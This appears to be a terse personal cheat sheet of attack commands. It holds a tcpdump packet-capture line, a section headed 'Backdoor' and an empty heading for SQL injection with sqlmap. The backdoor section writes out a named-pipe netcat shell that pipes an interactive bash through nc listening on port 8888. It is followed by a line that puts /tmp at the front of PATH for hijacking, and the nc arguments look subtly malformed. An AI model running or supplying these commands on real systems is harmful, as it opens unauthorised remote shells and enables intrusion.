tcpdump -i any -c 50 -q -t -X src not 192.168.28.100 and dst not 192.168.28.100 and port not 53

//Backdoor
mknod /tmp/f p
cat /tmp/f | /bin/bash -i 2>&1 | nc -lp 127.0.0.1 8888 > /tmp/f
export PATH=/tmp:$PATH

//SQLI w/ sqlmap
